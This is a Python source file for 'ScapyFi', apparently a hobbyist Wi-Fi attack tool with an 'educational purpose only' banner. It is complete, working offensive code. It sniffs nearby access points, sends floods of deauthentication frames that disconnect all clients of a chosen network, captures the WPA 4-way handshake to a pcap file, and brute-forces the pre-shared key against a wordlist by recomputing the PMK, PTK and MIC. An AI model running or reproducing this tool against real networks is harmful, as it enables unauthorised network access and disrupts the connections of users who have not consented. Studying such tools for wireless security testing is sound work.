#!/usr/bin/python
import signal
import itertools
import hashlib
import hmac
import os
import sys
import re
import time
import string
import binascii
try:
    from pbkdf2 import PBKDF2
except:
    print("Missing module pbkdf2 Installing...")
    os.system("pip3 install pbkdf2")

try:
    from scapy.all import *
except:
    print("Missing module scapy Installing...")
    os.system("pip3 install scapy")
try:
    import netifaces
except:
     print("Missing module netifaces Installing...")
     os.system("pip3 install netifaces")

#Global variables and banner:
OSX = True
if os.path.isfile("/usr/sbin/iwconfig"):
    OSX = False
ap_list = []
cli_list = []
to_frames = 0
from_frames = 0
ap_list_temp = []
temp_cli_mac = None
interface = ""
captured_handshake = False
DS_FLAG = 0b11
TO_DS = 0b01
chans = [1,2,3,4,5,6,7,8,9,10,11]
TGREEN =  '\033[32m' # Green Text
TWHITE = '\033[37m' #White (default) Text
TRED = '\033[31m' #Red (warnings/errors)
#AP class representing an access point
class AP:
    def __init__(self,mac,ssid,channel,cipher):
        self.mac = mac
        self.ssid = ssid
        self.channel = channel
        self.cipher = cipher
        self.client_mac = None
    def print_ap(self):
        print("MAC: " + TGREEN + self.mac + TWHITE +  " SSID: " + TGREEN + self.ssid + TWHITE + " CH: " + TGREEN + str(self.channel) + TWHITE + " CIPHER: " + TGREEN + self.cipher + TWHITE)


#Banner function
def banner():
    banner = """
 ___                    ___ _
/ __| __ __ _ _ __ _  _| __(_)
\__ \/ _/ _` | '_ \ || | _|| |
|___/\__\__,_| .__/\_, |_| |_|
             |_|   |__/

Version: 1.0
Author: Guyard Félix
Use for educational purpose only.
"""
    print(banner)
    print("+ Wifi interface in use : " + TGREEN +  str(interface) + TWHITE)
    print("\nSelect the module you want to use:")


    print("""

    [1] -> Network Sniffer
    [2] -> Handshake Grabber
    [3] -> Handshake Cracker

    Press Ctrl+c to Exit

    """)


#######################################
#     GLOBAL PROGRAM FUNCTIONS        #
#######################################

#Handle the ctrl+C to disable the monitoring mode and restore network adapter.
def signal_handler(signal,frame):
    print("\nDisabling monitoring mode on wireless NIC...",end='')
    try:
        if OSX == False:
            os.system("ip link set " + interface + " down")
            os.system("iw "+ interface + " set type managed")
            os.system("ip link set " + interface +" up")
            os.system("NetworkManager")
            print(TGREEN + "done" + TWHITE)
            sys.exit(1)
        else:
            os.system("ifconfig "+ interface + " up")
            print(TGREEN + "done" + TWHITE)
            sys.exit(1)
    except Exception as e:
        print("Error when disabling monitor mode")
        print(e)
        sys.exit(1)

#Handle the ctrl_C signal when the user is sniffing wifi
def signal_handler2(signal,frame):
    os.system("clear")
    banner()
    menu()

#Check if the user is root
def check_root():
    if not os.geteuid() == 0:
        print("You need to be root to run this tool.")
        exit(1)

#Check if NIC is valid
def is_interface_up(interface):
    addr = netifaces.ifaddresses(interface)
    return netifaces.AF_INET in addr

#Check the argument passed to the script
def check_args():
    if(len(sys.argv) < 3 or len(sys.argv) > 3):
        print("Wrong usage: ScapyFi.py -i interface_name")
        exit(1)
    if(sys.argv[1] != "-i"):
        print("Argument "+ str(sys.argv[1]) + " not understood")
        print("Usage : ScapyFi.py -i interface_name")
        exit(1)
    try:
        print(is_interface_up(sys.argv[2]))
    except:
        print("Interface not found.")
        exit(1)

    return sys.argv[2]


#Enable monitoring mode on the given interface
def enable_monitoring(interface_name):
    print("Activating monitoring mode on " + str(interface_name) + "...",end='')
    try:
        if OSX == False:
            os.system("killall wpa_supplicant")
            os.system("killall NetworkManager")
            os.system("ip link set " + interface_name + " down")
            os.system("iw "+ interface_name + " set monitor control")
            os.system("ip link set " + interface_name + " up")
            print(TGREEN + "done." + TWHITE)
        else:
            os.system("/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport "+ interface + " -z")
            print(TGREEN + "done." + TWHITE)
    except Exception as e:
        print("Error when activating monitoring mode:")
        print(e)


####################################
#       SNIFFING FUNCTION          #
####################################

# Determines the encrytption type of the AP
def get_encrytion(p):
    enc = []
    if p.subtype != 8:
        return enc
    packet = p
    if packet.haslayer(Dot11Elt):
        packet  = packet[Dot11Elt]
        while isinstance(packet, Dot11Elt):
            if packet.ID == 48:
                enc = "WPA2"
            elif packet.ID == 221 and packet.info.startswith(b'\x00P\xf2\x01\x01\x00'):
                enc = "WPA"
            packet = packet.payload
    if not enc:
        if (p.FCfield & 0b01000000 != 0):
            enc = "WEP"
        else:
            enc = "OPN"

    return enc


#802.11 Packet Handler to discover new AP
def packet_handler(packet):
    try:
        if packet.addr2 not in ap_list_temp and packet.type == 0 and packet.subtype == 8:
            ssid = packet.info.decode('utf8')
            mac = str(packet.addr2)
            cipher = str(get_encrytion(packet))
            channel = int(ord(packet[Dot11Elt:3].info))
            ap = AP(mac,ssid,channel,cipher)
            ap_list.append(ap)
            ap_list_temp.append(packet.addr2)
            print("[+] ", end="")
            ap.print_ap()
    except Exception as e:
        pass

#The network sniffer simply hop between channels and sniff the wireless network around the user.
def network_sniffer():
    i= 0
    print(TGREEN,"[INFO]",TWHITE," Press Ctrl+c to stop the capture.")
    print(TGREEN,"[INFO]",TWHITE," Looking for wireless access point, this could take a while")
    signal.signal(signal.SIGINT,signal_handler2) #Handle the ctrl+c to not quit and return to main menu.
    while True:
        sniff(iface=interface,prn=packet_handler,count=3,monitor=True)
        if OSX == False:
            os.system("iw dev "+ interface + " set channel %d" % chans[i])
        else:
            os.system("/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport " + interface + " --channel=%d" % chans[i])
        i = (i + 1) % len(chans)
        time.sleep(1)
#This function is going to deauth the clients on the specified AP
def deauth(ap):
    if OSX == True:
        print(TRED,"Warning : ",TWHITE,"Apple airport cards do not support packet injection.")
        print("No deauthing.")
        return
    time.sleep(3)
    target_mac = "ff:ff:ff:ff:ff:ff" #Deauth All clients
    gateway_mac = ap.mac
    print("Sending Deauth Frame to " + gateway_mac+"...")
    # Contructing the 802.11 frame:

    #Params :
        # addr1: destination MAC
        # addr2: source MAC
        # addr3: Access Point MAC
    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    # stack them up
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    # send the packet
    sendp(packet, inter=0.1, count=100, iface=interface, verbose=1)

#This function is checking if paquet contains EAPOL protocol.
#It is saving the EAPOL paquet into a pcap file for later crack.
#Return TRUE if the handshake was grabbed successfully.

ap_filter = "" #To filter the AP mac addr because the scapy filter doesn't work on mac os.
def checkForWPAHandshake(p):
    global from_frames
    global to_frames
    global ap_filter
    pktdump =  PcapWriter('./handshake/handshake.pcap',append=True,sync=True)
    if EAPOL in p and ((str(p.addr2) == ap_filter) or (str(p.addr1) == ap_filter)):
        pktdump.write(p)
        to_ds = p.FCfield & TO_DS != 0 # Identify the direction of the message C->AP or AP->
        if to_ds:
            to_frames += 1 #AP -> CLI
            print("AP -> CLI",to_frames)
        else:
            from_frames += 1 #CLI -> AP
            print("CLI -> AP",from_frames)
        # See if we captured 4 way handshake
        if (to_frames == 2) and (from_frames == 2):
            captured_handshake = True
            return True

        return False

    else:
        return False

#This function will launch a deauth to the given AP until the handshake is grabbed
def init_deauth(ap):
    choice = input("Would you like to deauth the AP ? (Yes/No) : ")
    if choice == "Yes":
        deauth(ap)
        time.sleep(5)
    elif choice == "No":
        print("Not deauthing.")
        return
    else:
        print("Bad input.")
        init_deauth(ap)
        return

#This function is going to listen for the hanshake and try to capture it.
#Once it is captured. It will be saved into a pcap file. (use the function wrpcap)
#The pcap file can then be used to crack the password.
def grab_handshake(ap):
    global ap_filter
    ap_filter = ap.mac
    if os.path.isfile("./handshake/handshake.pcap"):
        os.system("rm ./handshake/handshake.pcap") # In case the program was shutdown in the process
    os.system("clear")
    print("Switching to channel " + str(ap.channel))
    if OSX == False:
        os.system("iw dev "+ interface + " set channel %d" % ap.channel)
    else:
        os.system("/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport " + interface + " --channel=%d" % ap.channel)
    print("Sniffing " + ap.ssid + "...")
    signal.signal(signal.SIGINT,signal_handler2)
    #Deauth the AP in a thread#
    from threading import Thread
    t = Thread(target=init_deauth,args=(ap, ))
    t.start()
    ############################

    #Start sniffing
    p = sniff(iface=interface, stop_filter=checkForWPAHandshake, monitor=True) #Sniff for handshake

    #Out of the sniff function -> checkForWPAHandshake = True => Handshake grabbed
    print(TGREEN + "!Handshake Grabbed!" + TWHITE)
    t.join()
    os.system("mv ./handshake/handshake.pcap ./handshake/handshake-"+ap.ssid+".pcap")

#This is the handshake_grabber main function.
#It is asking the user to select the AP they want to sniff
#Then triggers the grab_handshake function to start the capture
def handshake_grabber():
    #Reset handshake counter
    global from_frames
    global to_frames
    from_frames = 0
    to_frames = 0
    os.system("clear")
    signal.signal(signal.SIGINT, signal.SIG_DFL)
    if len(ap_list) == 0:
        print(TGREEN,"No Access Point registred, Starting sniffing...",TWHITE)
        network_sniffer()
    else:
        i = 0
        for ap in ap_list:
            print("["+ TGREEN + str(i) + TWHITE + "] ",end="")
            ap.print_ap()
            i = i+1
        valid = False
        choice = None
        while valid == False:
            try:
                choice = int(input('Enter the target number:'))
                valid = True
                if len(ap_list) < choice or choice < 0:
                    valid = False
            except:
                print("Bad input")
        if valid == True:
            grab_handshake(ap_list[choice])

#####################################
#       CRACKING FUNCTIONS          #
#####################################

#This function is going to calculate the PTK
def calc_ptk(key, A, B):
    blen = 64
    i = 0
    R = b""

    while i<=((blen*8+159) /160):
        hmacsha1 = hmac.new(key, A + chr(0x00).encode() + B + chr(i).encode(), hashlib.sha1)
        i += 1
        R = R + hmacsha1.digest()

    return R[:blen]

#This function is going to fabricate the pairwise master key from the psk/ssid using a PRF
def calc_pmk(ssid, password):
    pmk = hashlib.pbkdf2_hmac('sha1', password.encode('ascii'), ssid.encode('ascii'), 4096, 32)
    return pmk


"""
handshake cracking function

Steps :
Open the pcap
Isolate the necessary frame field to fabricate our own EAPOL with PTK/PMK/MIC
Compute the MIC with the sniffed isolated fields and the PSKs given by the wordlist
Compare the computed MIC to the Client Frame MIC
Do the above steps until the C_MIC = F_MIC
"""

def crack_handshake(ap_ssid,pcap,wordlist):
    #Isolate the field we need from the PCAP hanshake
    os.system("clear")
    packets = rdpcap(pcap)
    ssid = ap_ssid
    pke = b"Pairwise key expansion"
    ap_mac = packets[0].addr2.replace(':','',5)
    cl_mac = packets[0].addr1.replace(':','',5)
    mac_ap = binascii.unhexlify(ap_mac)
    mac_cl = binascii.unhexlify(cl_mac)
    anonce = packets[0].load[13:45]
    snonce = packets[1].load[13:45]

    #Contructing the key data field
    key_data = min(mac_ap, mac_cl) + max(mac_ap, mac_cl) + min(anonce, snonce) + max(anonce, snonce)

    #Getting the sniffed MIC from the client
    message_integrity_check = binascii.hexlify(packets[1][Raw].load)[154:186]

    #Constructing the WPA data field with zeroed MIC
    wpa_data = binascii.hexlify(bytes(packets[1][EAPOL]))
    wpa_data = wpa_data.replace(message_integrity_check, b"0" * 32)
    wpa_data = binascii.a2b_hex(wpa_data)

    #Cracking process can begin
    print("Opening " + wordlist + "...")
    words =  open(wordlist,'r',encoding = "ISO-8859-1") #Open the wordlist
    print("Crack in progress...")
    for psk in words.readlines():
        psk = psk.replace("\n","")
        pairwise_master_key = calc_pmk(ssid, psk) #Calculate the PMK with tried psk
        pairwise_transient_key = calc_ptk(pairwise_master_key, pke, key_data) #calculating the PTK with the PMK result
        mic = hmac.new(pairwise_transient_key[0:16], wpa_data, "sha1").hexdigest()  #Calculate the MIC with the PMK,wpa_data to try and get the same MIC as sniffed

        if mic[:-8] == message_integrity_check.decode(): #Compare the MICs
            print("[KEY FOUND] : " + psk)
            print("PMK : ",end="")
            print(pairwise_master_key.hex())

            print("PTK :",end="")
            print(pairwise_transient_key.hex())

            print("Intercepted MIC : ",end="")
            print(message_integrity_check)

            print("Calculated MIC : ",end="")
            print(mic)

            print("\n You got it ! Have a good day :)")
            signal_handler(None,None)
            exit(1)
    print("KEY NOT FOUND...")
    exit(1)

#Handshake cracker user intraction function
def handshake_cracker():
    signal.signal(signal.SIGINT, signal.SIG_DFL)
    path = './handshake/'
    files = os.listdir(path)
    i = 0
    print("\nHandshake Loot directory content : ")
    for f in files:
        print("["+ TGREEN + str(i) + TWHITE + "] " +str(f))
        i+=1

    valid = False
    choice = None
    while valid == False:
             try:
                 choice = int(input('\n\nEnter the target handshake:'))
                 valid = True
                 if len(ap_list) < choice or choice < 0:
                     valid = False
             except:
                 print("Bad input")
             if valid == True:
                word_path = input("Enter Wordlist Path : ")
                if os.path.isfile(word_path):
                    crack_handshake(files[choice][10:].replace(".pcap",""),path+files[choice],word_path)
                else:
                    print ("Wordlist Not Found")
                    exit(1)



#Main menu funtion : The user can choose the module he want to execute.
def menu():
    signal.signal(signal.SIGINT,signal_handler) #Handle the ctrl+c command
    while True:
        choice = input("Module Selection :>")
        if choice == "1":
            network_sniffer()
        elif choice == "2":
            handshake_grabber()
            signal.signal(signal.SIGINT,signal_handler)
            banner()
        elif choice == "3":
            handshake_cracker()
        else:
            print("Bad Input")

#____________The main Program________________#
check_root() #Check if the user is root
interface = check_args()
os.system("clear")
banner()
enable_monitoring(interface)
menu()
